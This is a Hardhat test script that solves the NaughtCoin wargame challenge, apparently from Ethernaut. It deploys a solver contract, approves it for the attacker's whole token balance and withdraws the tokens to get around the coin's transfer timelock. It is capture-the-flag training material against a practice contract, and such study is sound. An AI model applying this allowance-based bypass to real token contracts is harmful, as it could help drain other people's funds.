const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] NaughtCoin', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('NaughtCoin');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('NaughtCoin', deployer);
            this.target = await ContractFactory.deploy(attacker.address);
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const NaughtCoinSolverFactory = await ethers.getContractFactory('NaughtCoinSolver', attacker);
        const NaughtCoinSolver = await NaughtCoinSolverFactory.deploy();
        let amount = await this.target.balanceOf(attacker.address);
        console.log(`\t attacker balance before : ${amount}`);
        console.log(`\t giving allownce for contract...`);
        let allowanceTX = await this.target.connect(attacker).approve(NaughtCoinSolver.address, amount); await allowanceTX.wait();
        console.log(`\t allownce : ${await this.target.allowance(attacker.address, NaughtCoinSolver.address)}`);
        let withdrawTX = await NaughtCoinSolver.connect(attacker).withdraw(this.target.address, amount); await withdrawTX.wait();
        console.log(`\t attacker balance after  : ${await this.target.balanceOf(attacker.address)}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await this.target.balanceOf(attacker.address))).to.be.eq(0);
    });
});